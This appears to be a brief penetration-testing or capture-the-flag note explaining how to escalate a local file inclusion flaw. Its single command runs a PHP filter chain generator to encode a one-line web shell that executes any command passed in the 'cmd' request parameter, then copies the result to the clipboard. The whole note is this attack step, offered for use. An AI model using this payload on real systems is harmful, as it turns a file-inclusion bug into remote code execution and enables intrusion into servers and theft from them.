
### This file is used after we have LFI

Command : 
`python3 php_filter_chain_generator.py --chain '<?php system($_REQUEST["cmd"]); ?>' | xclip -selection clipboard`


